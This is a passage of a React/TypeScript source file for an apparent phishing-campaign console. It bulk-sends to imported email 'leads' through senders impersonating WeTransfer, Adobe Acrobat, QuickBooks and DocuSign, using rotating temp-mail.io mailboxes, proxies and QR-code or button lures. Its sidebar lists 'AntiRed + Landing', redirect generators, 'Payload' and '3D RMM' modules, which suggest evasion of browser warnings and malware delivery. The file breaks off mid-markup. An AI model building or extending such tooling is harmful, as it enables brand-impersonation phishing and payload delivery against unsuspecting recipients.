'use client';

import React from 'react';
import {
  Activity,
  ArrowLeft,
  Copy,
  FileText,
  FolderOpen,
  Globe,
  LayoutDashboard,
  Link2,
  Mail,
  Menu,
  RefreshCw,
  Save,
  Send,
  Settings,
  Shield,
  Square,
  Upload,
  UserCog,
  Users,
  X,
  Zap,
} from 'lucide-react';

type SenderKey = 'wetransfer' | 'adobe' | 'quickbooks' | 'docusign';
type LeadStatus = 'pending' | 'sending' | 'sent' | 'failed' | 'skipped';
type RunState = 'idle' | 'running' | 'stopped' | 'completed';
type LogLevel = 'info' | 'success' | 'warning' | 'error' | 'stopped' | 'system';
type ModalKey =
  | 'credentials'
  | 'leads'
  | 'settings'
  | 'logs'
  | 'attach-host'
  | 'rmm'
  | 'browser'
  | 'antired'
  | 'redirect-generator'
  | 'domains'
  | 'campaign-redirect'
  | 'payload'
  | 'b2b'
  | 'blast';

type Lead = {
  id: string;
  rawInput: string;
  normalized: string;
  status: LeadStatus;
  senderStatus: Partial<Record<SenderKey, LeadStatus>>;
  addedAt: string;
  sentAt?: string;
  failedAt?: string;
  metadata?: Record<string, string>;
};

type RuntimeLog = {
  id: string;
  timestamp: string;
  sender: SenderKey | 'system';
  level: LogLevel;
  message: string;
};

type SenderConfig = {
  connected: boolean;
  fileType: string;
  orientation: 'landscape' | 'portrait';
  design: string;
  cta: 'button' | 'qr';
  useCustomMessage: boolean;
  rateLimitDelay: number;
  tempProvider: string;
  poolSize: number;
  autoRotate: boolean;
  notes: string;
};

type DashboardSettings = {
  proxy: string;
  defaultDelay: number;
  defaultFileType: string;
  defaultOrientation: 'landscape' | 'portrait';
  defaultCta: 'button' | 'qr';
  defaultTempProvider: string;
};

type CredentialsState = {
  wetransfer: { provider: string; account: string; proxy: string; tempMailApiKey: string };
  adobe: { clientId: string; tenant: string };
  quickbooks: { companyId: string; environment: string };
  docusign: { accountId: string; integrationKey: string };
};

type Toast = { id: string; message: string; level: LogLevel };

type WeTransferStepStatus = 'pending' | 'running' | 'success' | 'failed' | 'skipped';

type WeTransferStep = {
  id: string;
  label: string;
  status: WeTransferStepStatus;
  detail?: string;
  timestamp?: string;
  isReal: boolean;
};

type WeTransferSessionState = {
  sessionId: string | null;
  status: 'idle' | 'initializing' | 'ready' | 'sending' | 'stopped' | 'completed' | 'failed';
  mailbox: string | null;
  steps: WeTransferStep[];
};

const SENDERS: Array<{ key: SenderKey; label: string }> = [
  { key: 'wetransfer', label: 'WeTransfer' },
  { key: 'adobe', label: 'Adobe Acrobat' },
  { key: 'quickbooks', label: 'QuickBooks' },
  { key: 'docusign', label: 'DocuSign' },
];

const SIDEBAR_ITEMS: Array<{ id: 'crm-sender' | ModalKey; label: string; icon: React.ComponentType<{ className?: string }> }> = [
  { id: 'credentials', label: 'Credentials', icon: UserCog },
  { id: 'leads', label: 'Leads Management', icon: Users },
  { id: 'attach-host', label: 'Attach / Host', icon: FolderOpen },
  { id: 'rmm', label: '3D RMM', icon: LayoutDashboard },
  { id: 'browser', label: '3D Browser', icon: Globe },
  { id: 'crm-sender', label: 'CRM Sender', icon: Send },
  { id: 'antired', label: 'AntiRed + Landing', icon: Shield },
  { id: 'redirect-generator', label: 'Redirect Generator', icon: Link2 },
  { id: 'domains', label: 'Domains', icon: Globe },
  { id: 'campaign-redirect', label: 'Campaign Redirect', icon: RefreshCw },
  { id: 'payload', label: 'Payload', icon: FileText },
  { id: 'b2b', label: 'B2B Sender', icon: Mail },
  { id: 'blast', label: '3D Blast', icon: Zap },
  { id: 'settings', label: 'Settings', icon: Settings },
  { id: 'logs', label: 'Logs', icon: Activity },
];

function nowIso() {
  return new Date().toISOString();
}

function formatTime(value: string) {
  return new Date(value).toLocaleTimeString();
}

function makeId(prefix: string) {
  return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function normalizeLead(value: string) {
  return value.trim().toLowerCase();
}

function parseLeadLines(input: string) {
  return input
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean);
}

function dedupeLeads(existing: Lead[], values: string[]) {
  const known = new Set(existing.map((lead) => lead.normalized));
  const added: Lead[] = [];

  values.forEach((raw) => {
    const normalized = normalizeLead(raw);
    if (!normalized || known.has(normalized)) return;
    known.add(normalized);
    added.push({
      id: makeId('lead'),
      rawInput: raw,
      normalized,
      status: 'pending',
      senderStatus: {},
      addedAt: nowIso(),
    });
  });

  return added;
}

function createDefaultSenderConfig(): SenderConfig {
  return {
    connected: true,
    fileType: 'PDF',
    orientation: 'landscape',
    design: 'Modern',
    cta: 'button',
    useCustomMessage: true,
    rateLimitDelay: 2,
    tempProvider: 'TempMail',
    poolSize: 20,
    autoRotate: true,
    notes: '',
  };
}

const LOCAL_STORAGE_KEY = 'crm-console-session-v2';

export default function DashboardPage() {
  const [sidebarOpen, setSidebarOpen] = React.useState(true);
  const [campaignName, setCampaignName] = React.useState('Q3 Operations Campaign');
  const [activeSender, setActiveSender] = React.useState<SenderKey>('wetransfer');
  const [runState, setRunState] = React.useState<RunState>('idle');
  const [activeModal, setActiveModal] = React.useState<ModalKey | null>(null);
  const [showStopConfirm, setShowStopConfirm] = React.useState(false);
  const [toasts, setToasts] = React.useState<Toast[]>([]);
  const [isPreparing, setIsPreparing] = React.useState(false);

  const [leads, setLeads] = React.useState<Lead[]>([]);
  const [logs, setLogs] = React.useState<RuntimeLog[]>([]);
  const [leadsInput, setLeadsInput] = React.useState('');
  const [dedupeEnabled, setDedupeEnabled] = React.useState(true);
  const [moduleNotes, setModuleNotes] = React.useState<Record<string, string>>({});

  const [settingsState, setSettingsState] = React.useState<DashboardSettings>({
    proxy: '',
    defaultDelay: 2,
    defaultFileType: 'PDF',
    defaultOrientation: 'landscape',
    defaultCta: 'button',
    defaultTempProvider: 'TempMail',
  });

  const [credentials, setCredentials] = React.useState<CredentialsState>({
    wetransfer: { provider: 'temp-mail.io', account: '', proxy: '', tempMailApiKey: '' },
    adobe: { clientId: '', tenant: '' },
    quickbooks: { companyId: '', environment: 'sandbox' },
    docusign: { accountId: '', integrationKey: '' },
  });

  const [senderConfigs, setSenderConfigs] = React.useState<Record<SenderKey, SenderConfig>>({
    wetransfer: createDefaultSenderConfig(),
    adobe: createDefaultSenderConfig(),
    quickbooks: createDefaultSenderConfig(),
    docusign: createDefaultSenderConfig(),
  });

  const stopRequestedRef = React.useRef(false);
  const timerRef = React.useRef<NodeJS.Timeout | null>(null);
  const leadsRef = React.useRef<Lead[]>([]);
  const senderConfigsRef = React.useRef(senderConfigs);
  const wtCampaignId = React.useRef<string>(`dashboard_${Date.now()}`);

  const [weTransferSession, setWeTransferSession] = React.useState<WeTransferSessionState>({
    sessionId: null,
    status: 'idle',
    mailbox: null,
    steps: [],
  });

  const updateLeads = React.useCallback(
    (updater: Lead[] | ((prev: Lead[]) => Lead[])) => {
      setLeads((prev) => {
        const next = typeof updater === 'function' ? (updater as (prev: Lead[]) => Lead[])(prev) : updater;
        leadsRef.current = next;
        return next;
      });
    },
    []
  );

  const addToast = React.useCallback((message: string, level: LogLevel = 'info') => {
    const id = makeId('toast');
    setToasts((prev) => [...prev, { id, message, level }]);
    setTimeout(() => setToasts((prev) => prev.filter((toast) => toast.id !== id)), 2200);
  }, []);

  const appendLog = React.useCallback(
    (level: LogLevel, message: string, sender: SenderKey | 'system' = 'system') => {
      setLogs((prev) => [
        ...prev,
        {
          id: makeId('log'),
          timestamp: nowIso(),
          sender,
          level,
          message,
        },
      ]);
    },
    []
  );

  React.useEffect(() => {
    const saved = localStorage.getItem(LOCAL_STORAGE_KEY);
    if (!saved) return;
    try {
      const parsed = JSON.parse(saved);
      if (parsed.campaignName) setCampaignName(parsed.campaignName);
      if (parsed.activeSender) setActiveSender(parsed.activeSender);
      if (Array.isArray(parsed.leads)) {
        leadsRef.current = parsed.leads;
        setLeads(parsed.leads);
      }
      if (Array.isArray(parsed.logs)) setLogs(parsed.logs);
      if (parsed.settingsState) setSettingsState(parsed.settingsState);
      if (parsed.senderConfigs) setSenderConfigs(parsed.senderConfigs);
      if (parsed.credentials) setCredentials(parsed.credentials);
      if (parsed.moduleNotes) setModuleNotes(parsed.moduleNotes);
      appendLog('system', 'Restored local session cache', 'system');
    } catch {
      appendLog('warning', 'Could not restore local session cache', 'system');
    }
  }, [appendLog]);

  React.useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  React.useEffect(() => {
    leadsRef.current = leads;
  }, [leads]);

  React.useEffect(() => {
    senderConfigsRef.current = senderConfigs;
  }, [senderConfigs]);

  const totalUploaded = leads.length;
  const totalSent = leads.filter((lead) => lead.status === 'sent').length;
  const totalFailed = leads.filter((lead) => lead.status === 'failed').length;
  const totalRemaining = leads.filter((lead) => lead.status === 'pending' || lead.status === 'sending').length;
  const successRate = totalUploaded ? Math.round((totalSent / totalUploaded) * 100) : 0;

  const saveSession = React.useCallback(() => {
    localStorage.setItem(
      LOCAL_STORAGE_KEY,
      JSON.stringify({
        campaignName,
        activeSender,
        leads,
        logs,
        settingsState,
        senderConfigs,
        credentials,
        moduleNotes,
      })
    );
    appendLog('success', 'Campaign saved to local session storage', 'system');
    addToast('Session saved', 'success');
  }, [campaignName, activeSender, leads, logs, settingsState, senderConfigs, credentials, moduleNotes, appendLog, addToast]);

  function openModule(item: 'crm-sender' | ModalKey) {
    if (item === 'crm-sender') {
      setActiveModal(null);
      return;
    }
    setActiveModal(item);
  }

  function importLeadLines(lines: string[]) {
    const toImport = dedupeEnabled ? dedupeLeads(leads, lines) : lines.map((raw) => ({
      id: makeId('lead'),
      rawInput: raw,
      normalized: normalizeLead(raw),
      status: 'pending' as LeadStatus,
      senderStatus: {},
      addedAt: nowIso(),
    })).filter((lead) => Boolean(lead.normalized));

    if (!toImport.length) {
      addToast('No new leads imported', 'warning');
      appendLog('warning', 'Leads import skipped (no unique lines)', 'system');
      return;
    }

    updateLeads((prev) => [...prev, ...toImport]);
    appendLog('success', `Leads imported: ${toImport.length}`, 'system');
    addToast(`Imported ${toImport.length} lead(s)`, 'success');
  }

  async function handleLeadFileUpload(event: React.ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0];
    if (!file) return;
    const text = await file.text();
    importLeadLines(parseLeadLines(text));
    appendLog('info', `File uploaded: ${file.name}`, 'system');
    event.target.value = '';
  }

  function clearAllLeads() {
    updateLeads([]);
    appendLog('warning', 'Lead pool cleared', 'system');
    addToast('Lead pool cleared', 'warning');
  }

  function processNextLead(sender: SenderKey) {
    if (stopRequestedRef.current) {
      updateLeads((prev) => prev.map((lead) => (lead.status === 'sending' ? { ...lead, status: 'pending' } : lead)));
      setRunState('stopped');
      appendLog('stopped', `Send stopped for ${sender}`, sender);
      addToast('Send stopped', 'stopped');
      return;
    }

    const nextLead = leadsRef.current.find(
      (lead) => lead.status === 'pending' && lead.senderStatus[sender] !== 'sent'
    );

    if (!nextLead) {
      setRunState('completed');
      appendLog('success', `Send completed for ${sender}`, sender);
      addToast('Run completed', 'success');
      return;
    }

    updateLeads((prev) =>
      prev.map((lead) =>
        lead.id === nextLead.id
          ? { ...lead, status: 'sending', senderStatus: { ...lead.senderStatus, [sender]: 'sending' } }
          : lead
      )
    );

    if (sender === 'wetransfer') {
      // WeTransfer mode: call backend send-lead API (real temp mailbox + simulated browser steps)
      const campaignId = wtCampaignId.current;
      const filename = senderConfigsRef.current.wetransfer.fileType === 'PDF' ? 'document.pdf' : `document.${senderConfigsRef.current.wetransfer.fileType.toLowerCase()}`;
      fetch('/api/wetransfer/send-lead', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ campaignId, leadEmail: nextLead.normalized, filename }),
      })
        .then((res) => res.json())
        .then((data: { success: boolean; detail?: string; transferUrl?: string; logs?: string[] }) => {
          if (stopRequestedRef.current) {
            updateLeads((prev) =>
              prev.map((lead) => (lead.status === 'sending' ? { ...lead, status: 'pending' } : lead))
            );
            setRunState('stopped');
            appendLog('stopped', `Send stopped for ${sender}`, sender);
            addToast('Send stopped', 'stopped');
            return;
          }
          // Log backend step lines
          if (Array.isArray(data.logs)) {
            data.logs.forEach((line: string) => appendLog('info', line, 'wetransfer'));
          }
          updateLeads((prev) =>
            prev.map((lead) => {
              if (lead.id !== nextLead.id) return lead;
              if (!data.success) {
                return { ...lead, status: 'failed', failedAt: nowIso(), senderStatus: { ...lead.senderStatus, [sender]: 'failed' } };
              }
              return { ...lead, status: 'sent', sentAt: nowIso(), senderStatus: { ...lead.senderStatus, [sender]: 'sent' } };
            })
          );
          appendLog(
            data.success ? 'success' : 'error',
            data.success
              ? `WeTransfer sent: ${nextLead.normalized}${data.transferUrl ? ` | ${data.transferUrl}` : ''}`
              : `WeTransfer failed: ${nextLead.normalized}${data.detail ? ` — ${data.detail}` : ''}`,
            sender
          );
          const delayMs = Math.max(300, senderConfigsRef.current[sender].rateLimitDelay * 1000);
          timerRef.current = setTimeout(() => processNextLead(sender), delayMs);
        })
        .catch((err: Error) => {
          appendLog('error', `WeTransfer API error: ${err.message}`, 'wetransfer');
          updateLeads((prev) =>
            prev.map((lead) =>
              lead.id === nextLead.id
                ? { ...lead, status: 'failed', failedAt: nowIso(), senderStatus: { ...lead.senderStatus, [sender]: 'failed' } }
                : lead
            )
          );
          const delayMs = Math.max(300, senderConfigsRef.current[sender].rateLimitDelay * 1000);
          timerRef.current = setTimeout(() => processNextLead(sender), delayMs);
        });
      return;
    }

    // Non-WeTransfer senders: local simulation
    const delayMs = Math.max(300, senderConfigsRef.current[sender].rateLimitDelay * 1000);
    timerRef.current = setTimeout(() => {
      const shouldFail = nextLead.normalized.includes('fail') || Math.random() < 0.08;
      updateLeads((prev) =>
        prev.map((lead) => {
          if (lead.id !== nextLead.id) return lead;
          if (shouldFail) {
            return {
              ...lead,
              status: 'failed',
              failedAt: nowIso(),
              senderStatus: { ...lead.senderStatus, [sender]: 'failed' },
            };
          }
          return {
            ...lead,
            status: 'sent',
            sentAt: nowIso(),
            senderStatus: { ...lead.senderStatus, [sender]: 'sent' },
          };
        })
      );

      appendLog(
        shouldFail ? 'error' : 'success',
        shouldFail
          ? `Lead failed: ${nextLead.normalized}`
          : `Lead sent: ${nextLead.normalized}`,
        sender
      );

      processNextLead(sender);
    }, delayMs);
  }

  function startSend() {
    if (runState === 'running') return;
    const pendingForSender = leads.filter(
      (lead) => lead.status === 'pending' && lead.senderStatus[activeSender] !== 'sent'
    );

    if (!pendingForSender.length) {
      appendLog('warning', 'No pending leads to send. Resume skipped.', activeSender);
      addToast('No pending leads', 'warning');
      return;
    }

    if (activeSender === 'wetransfer') {
      const apiKey = credentials.wetransfer.tempMailApiKey.trim();
      if (!apiKey) {
        appendLog('error', 'temp-mail.io API key is required for WeTransfer mode. Add it in Credentials.', 'wetransfer');
        addToast('Set temp-mail.io API key in Credentials', 'error');
        return;
      }

      setIsPreparing(true);
      setWeTransferSession({ sessionId: null, status: 'initializing', mailbox: null, steps: [] });
      appendLog('info', 'Initialising WeTransfer session — creating temp-mail.io mailbox…', 'wetransfer');

      const campaignId = wtCampaignId.current;
      fetch('/api/wetransfer/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ campaignId, tempMailApiKey: apiKey }),
      })
        .then((res) => res.json())
        .then((data: {
          sessionId?: string;
          status?: string;
          mailbox?: { email: string };
          steps?: WeTransferStep[];
          logs?: string[];
          error?: string;
        }) => {
          setIsPreparing(false);
          if (data.error || data.status === 'failed') {
            const msg = data.error || 'WeTransfer session initialisation failed';
            appendLog('error', msg, 'wetransfer');
            addToast(msg, 'error');
            setWeTransferSession((prev) => ({ ...prev, status: 'failed' }));
            return;
          }
          // Log each step line from the init
          if (Array.isArray(data.logs)) {
            data.logs.forEach((line: string) => appendLog('info', line, 'wetransfer'));
          }
          setWeTransferSession({
            sessionId: data.sessionId ?? null,
            status: (data.status as WeTransferSessionState['status']) ?? 'ready',
            mailbox: data.mailbox?.email ?? null,
            steps: (data.steps as WeTransferStep[]) ?? [],
          });
          appendLog('success', `WeTransfer session ready | mailbox: ${data.mailbox?.email ?? 'unknown'}`, 'wetransfer');
          addToast(`Temp mailbox: ${data.mailbox?.email ?? '?'}`, 'success');

          setRunState('running');
          stopRequestedRef.current = false;
          appendLog('info', `WeTransfer send started (${pendingForSender.length} pending)`, 'wetransfer');
          processNextLead('wetransfer');
        })
        .catch((err: Error) => {
          setIsPreparing(false);
          appendLog('error', `Failed to init WeTransfer session: ${err.message}`, 'wetransfer');
          addToast('WeTransfer init failed', 'error');
          setWeTransferSession((prev) => ({ ...prev, status: 'failed' }));
        });
      return;
    }

    setIsPreparing(true);
    setTimeout(() => {
      setIsPreparing(false);
      setRunState('running');
      stopRequestedRef.current = false;
      appendLog('info', `Send started (${pendingForSender.length} pending)`, activeSender);
      addToast(`Started ${activeSender} run`, 'info');
      processNextLead(activeSender);
    }, 280);
  }

  function requestStop() {
    setShowStopConfirm(true);
  }

  function confirmStop() {
    stopRequestedRef.current = true;
    setShowStopConfirm(false);
  }

  const activeConfig = senderConfigs[activeSender];

  return (
    <div className="min-h-screen flex bg-[#F8F9FC] text-slate-900">
      <aside
        className={`bg-[#1E1E2E] text-[#E0E0E0] ${sidebarOpen ? 'w-[260px]' : 'w-16'} transition-all duration-200 border-r border-[#2D2D44] flex flex-col`}
      >
        <div className="h-14 px-3 flex items-center justify-between border-b border-[#2D2D44]">
          <div className="flex items-center gap-2 overflow-hidden">
            <div className="w-7 h-7 rounded bg-[#6C63FF] text-white text-xs font-bold flex items-center justify-center">3D</div>
            {sidebarOpen && <span className="font-semibold">Campaign Console</span>}
          </div>
          <button onClick={() => setSidebarOpen((prev) => !prev)} title="Toggle sidebar">
            <Menu className="w-4 h-4 text-[#9F9FF8]" />
          </button>
        </div>

        <nav className="p-2 space-y-1 overflow-y-auto">
          {SIDEBAR_ITEMS.map((item) => {
            const Icon = item.icon;
            const isActive = item.id === 'crm-sender' && activeModal === null;
            return (
              <button
                key={item.id}
                onClick={() => openModule(item.id)}
                className="w-full text-left flex items-center gap-2 px-3 py-2 rounded transition-colors text-sm"
                style={
                  isActive
                    ? { background: '#2D2D44', borderLeft: '3px solid #6C63FF', color: '#FFFFFF' }
                    : { color: '#E0E0E0' }
                }
                title={item.label}
              >
                <Icon className="w-4 h-4 text-[#6C63FF]" />
                {sidebarOpen && <span>{item.label}</span>}
              </button>
            );
          })}
        </nav>
      </aside>

      <main className="flex-1 min-w-0 flex flex-col">
        <header className="h-14 bg-white border-b border-slate-200 px-4 flex items-center gap-3 sticky top-0 z-20">
          <button className="p-2 rounded hover:bg-slate-100" title="Back">
            <ArrowLeft className="w-4 h-4" />
          </button>

          <input
            value={campaignName}
            onChange={(event) => setCampaignName(event.target.value)}
            className="h-9 px-3 rounded border border-slate-300 text-sm min-w-0 w-[280px]"
            placeholder="Campaign name"
          />

          <div className="ml-auto flex items-center gap-2">
            <button
              onClick={saveSession}
              className="h-9 px-3 rounded bg-emerald-600 hover:bg-emerald-700 text-white text-sm flex items-center gap-2"
              title="Save session"
            >
              <Save className="w-4 h-4" /> Save
            </button>
            <button
              onClick={startSend}
              disabled={runState === 'running' || isPreparing}
              className="h-9 px-3 rounded bg-blue-600 hover:bg-blue-700 disabled:opacity-60 text-white text-sm flex items-center gap-2"
              title="Start send"
            >
              <Send className="w-4 h-4" /> {isPreparing ? 'Preparing...' : 'Send'}
            </button>
            <button
              onClick={requestStop}
              disabled={runState !== 'running'}
              className="h-9 px-3 rounded bg-red-600 hover:bg-red-700 disabled:opacity-60 text-white text-sm flex items-center gap-2"
              title="Stop send"
            >
              <Square className="w-4 h-4" /> Stop
            </button>
          </div>
        </header>

        <section className="px-4 py-3 border-b border-slate-200 bg-white">
          <div className="flex flex-wrap gap-2">
            {SENDERS.map((sender) => (
              <button
                key={sender.key}
                onClick={() => {
                  setActiveSender(sender.key);
                  appendLog('info', `Provider changed to ${sender.label}`, 'system');
                }}
                className="px-3 py-1.5 rounded text-sm border"
                style={
                  activeSender === sender.key
                    ? { background: '#6C63FF', color: '#fff', borderColor: '#6C63FF' }
                    : { background: '#fff', color: '#4B5563', borderColor: '#D1D5DB' }
                }
              >
                {sender.label}
              </button>
            ))}
            <button className="px-3 py-1.5 rounded text-sm border border-dashed border-[#6C63FF] text-[#6C63FF]">
              + Add Sender
            </button>
          </div>
        </section>

        <section className="p-4 grid md:grid-cols-6 gap-3">
          <StatCard label="Uploaded" value={totalUploaded} />
          <StatCard label="Sent" value={totalSent} tone="success" />
          <StatCard label="Remaining" value={totalRemaining} tone="warning" />
          <StatCard label="Failed" value={totalFailed} tone="danger" />
          <StatCard label="Run" value={runState} />
          <StatCard label="Success" value={`${successRate}%`} />
        </section>

        <section className="px-4 pb-4 flex-1 overflow-auto space-y-4">
          {activeSender === 'wetransfer' ? (
            <div className="space-y-4">
              <div className="grid lg:grid-cols-2 gap-4">
                <Panel title="Connection & Account">
                  <div className="grid sm:grid-cols-2 gap-3 text-sm">
                    <Field label="Status">
                      <span className={`px-2 py-1 rounded ${activeConfig.connected ? 'bg-emerald-100 text-emerald-700' : 'bg-red-100 text-red-700'}`}>
                        {activeConfig.connected ? 'Connected' : 'Disconnected'}
                      </span>
                    </Field>
                    <Field label="Temp Provider">
                      <span className="px-2 py-1 rounded bg-blue-50 text-blue-700 text-xs font-mono">temp-mail.io</span>
                    </Field>
                    <Field label="Pool Size">
                      <input
                        type="number"
                        className="input"
                        value={activeConfig.poolSize}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, poolSize: Number(event.target.value || 0) },
                          }))
                        }
                      />
                    </Field>
                    <Field label="Rate Delay (sec)">
                      <input
                        type="number"
                        className="input"
                        value={activeConfig.rateLimitDelay}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, rateLimitDelay: Number(event.target.value || 1) },
                          }))
                        }
                      />
                    </Field>
                  </div>
                  <div className="mt-3 text-sm">
                    <Field label="temp-mail.io API Key">
                      <div className="flex gap-2">
                        <input
                          type="password"
                          className="input flex-1"
                          value={credentials.wetransfer.tempMailApiKey}
                          onChange={(e) =>
                            setCredentials((p) => ({
                              ...p,
                              wetransfer: { ...p.wetransfer, tempMailApiKey: e.target.value },
                            }))
                          }
                          placeholder="Paste your temp-mail.io API key"
                        />
                        <span
                          className={`px-2 py-1 rounded text-xs flex items-center ${credentials.wetransfer.tempMailApiKey ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`}
                        >
                          {credentials.wetransfer.tempMailApiKey ? '✓ Set' : '! Required'}
                        </span>
                      </div>
                    </Field>
                  </div>
                  <div className="mt-3 flex items-center gap-3 text-sm">
                    <label className="flex items-center gap-2">
                      <input
                        type="checkbox"
                        checked={activeConfig.autoRotate}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, autoRotate: event.target.checked },
                          }))
                        }
                      />
                      Auto-rotate
                    </label>
                  </div>
                </Panel>

                <Panel title="File / Message / CTA">
                  <div className="grid sm:grid-cols-2 gap-3 text-sm">
                    <Field label="File Type">
                      <select
                        className="input"
                        value={activeConfig.fileType}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, fileType: event.target.value },
                          }))
                        }
                      >
                        {['PDF', 'PPTX', 'DOCX', 'ZIP'].map((option) => (
                          <option key={option}>{option}</option>
                        ))}
                      </select>
                    </Field>
                    <Field label="PDF Orientation">
                      <select
                        className="input"
                        value={activeConfig.orientation}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, orientation: event.target.value as 'landscape' | 'portrait' },
                          }))
                        }
                      >
                        <option value="landscape">Horizontal / Landscape</option>
                        <option value="portrait">Vertical / Portrait</option>
                      </select>
                    </Field>
                    <Field label="Design">
                      <input
                        className="input"
                        value={activeConfig.design}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, design: event.target.value },
                          }))
                        }
                      />
                    </Field>
                    <Field label="CTA">
                      <select
                        className="input"
                        value={activeConfig.cta}
                        onChange={(event) =>
                          setSenderConfigs((prev) => ({
                            ...prev,
                            wetransfer: { ...prev.wetransfer, cta: event.target.value as 'button' | 'qr' },
                          }))
                        }
                      >
                        <option value="button">Button</option>
                        <option value="qr">QR code</option>
                      </select>
                    </Field>
                  </div>
                  <label className="mt-3 flex items-center gap-2 text-sm">
                    <input
                      type="checkbox"
                      checked={activeConfig.useCustomMessage}
                      onChange={(event) =>
                        setSenderConfigs((prev) => ({
                          ...prev,
                          wetransfer: { ...prev.wetransfer, useCustomMessage: event.target.checked },
                        }))
                      }
                    />
                    Custom transfer message
                  </label>
                </Panel>
              </div>

              {/* WeTransfer execution steps panel */}
              <WeTransferStepsPanel session={weTransferSession} />
            </div>
          ) : (
            <MockSenderPanel
              sender={activeSender}
              config={activeConfig}
              onConfigChange={(next) =>
                setSenderConfigs((prev) => ({ ...prev, [activeSender]: { ...prev[activeSender], ...next } }))
              }
              onLog={(msg) => appendLog('info', msg, activeSender)}
            />
          )}
        </section>

        <section className="bg-[#1A1A2E] text-white px-4 py-3 border-t border-[#2D2D44] h-56 overflow-auto font-mono text-xs">
          <div className="space-y-1">
            {logs.length === 0 && <div className="text-slate-400">No runtime actions yet.</div>}
            {logs.map((log) => (
              <div key={log.id} className="flex gap-2">
                <span className="text-[#A78BFA]">{formatTime(log.timestamp)}</span>
                <span className="uppercase min-w-[88px]" style={{ color: senderColor(log.sender) }}>
                  [{log.sender}]
                </span>
                <span style={{ color: levelColor(log.level) }}>{log.level}</span>
                <span style={{ color: '#E2E8F0' }}>{log.message}</span>
              </div>
            ))}
            <div className="text-slate-500">— end of log —</div>
          </div>
        </section>
      </main>

      <div className="fixed right-4 bottom-4 bg-white shadow-lg rounded-lg border border-slate-200 p-3 w-64">
        <p className="text-xs text-slate-500">Quick URL</p>
        <div className="mt-1 flex items-center gap-2">
          <code className="text-xs truncate flex-1">https://local.3d-suite/session/current</code>
          <button
            onClick={async () => {
              await navigator.clipboard.writeText('https://local.3d-suite/session/current');
              addToast('Quick URL copied', 'success');
            }}
            title="Copy URL"
          >
            <Copy className="w-4 h-4 text-[#6C63FF]" />
          </button>
        </div>
      </div>

      {activeModal && (
        <ModalShell title={modalTitle(activeModal)} onClose={() => setActiveModal(null)}>
          {activeModal === 'leads' && (
            <div className="space-y-3 text-sm">
              <textarea
                rows={7}
                value={leadsInput}
                onChange={(event) => setLeadsInput(event.target.value)}
                placeholder="Paste one lead per line"
                className="w-full border rounded px-3 py-2 font-mono"
              />
              <div className="flex items-center gap-3">
                <label className="flex items-center gap-2">
                  <input type="checkbox" checked={dedupeEnabled} onChange={(event) => setDedupeEnabled(event.target.checked)} />
                  Dedupe exact duplicates
                </label>
                <label className="text-xs cursor-pointer text-[#6C63FF] inline-flex items-center gap-1">
                  <Upload className="w-3 h-3" /> Upload text file
                  <input type="file" className="hidden" accept=".txt,.csv,.log,.text" onChange={handleLeadFileUpload} />
                </label>
              </div>
              <div className="grid grid-cols-3 gap-2 text-center">
                <MiniStat label="Uploaded" value={totalUploaded} />
                <MiniStat label="Sent" value={totalSent} />
                <MiniStat label="Remaining" value={totalRemaining} />
              </div>
              <div className="flex gap-2">
                <button
                  className="px-3 py-2 rounded bg-[#6C63FF] text-white"
                  onClick={() => {
                    importLeadLines(parseLeadLines(leadsInput));
                    setLeadsInput('');
                  }}
                >
                  Parse & Add Leads
                </button>
                <button className="px-3 py-2 rounded border" onClick={clearAllLeads}>Clear All</button>
              </div>
            </div>
          )}

          {activeModal === 'credentials' && (
            <div className="space-y-4 text-sm">
              <div>
                <p className="text-xs font-semibold text-slate-500 uppercase tracking-wide mb-2">WeTransfer / temp-mail.io</p>
                <div className="grid sm:grid-cols-2 gap-3">
                  <Field label="Provider">
                    <span className="px-2 py-1 rounded bg-blue-50 text-blue-700 text-xs font-mono">temp-mail.io</span>
                  </Field>
                  <Field label="Base URL">
                    <span className="px-2 py-1 rounded bg-slate-100 text-slate-600 text-xs font-mono">https://api.temp-mail.io</span>
                  </Field>
                  <div className="sm:col-span-2">
                    <Field label="temp-mail.io API Key (X-API-Key)">
                      <div className="flex gap-2">
                        <input
                          type="password"
                          className="input flex-1"
                          value={credentials.wetransfer.tempMailApiKey}
                          onChange={(e) => setCredentials((p) => ({ ...p, wetransfer: { ...p.wetransfer, tempMailApiKey: e.target.value } }))}
                          placeholder="Paste your temp-mail.io API key"
                        />
                        <span className={`px-2 py-1 rounded text-xs flex items-center whitespace-nowrap ${credentials.wetransfer.tempMailApiKey ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`}>
                          {credentials.wetransfer.tempMailApiKey ? '✓ Set' : '! Required for WeTransfer'}
                        </span>
                      </div>
                    </Field>
                  </div>
                  <Field label="WeTransfer Account (optional)"><input className="input" value={credentials.wetransfer.account} onChange={(e) => setCredentials((p) => ({ ...p, wetransfer: { ...p.wetransfer, account: e.target.value } }))} /></Field>
                  <Field label="Proxy (optional)"><input className="input" value={credentials.wetransfer.proxy} onChange={(e) => setCredentials((p) => ({ ...p, wetransfer: { ...p.wetransfer, proxy: e.target.value } }))} /></Field>
                </div>
              </div>
              <hr className="border-slate-200" />
              <div>
                <p className="text-xs font-semibold text-slate-500 uppercase tracking-wide mb-2">Other Senders</p>
                <div className="grid sm:grid-cols-2 gap-3">
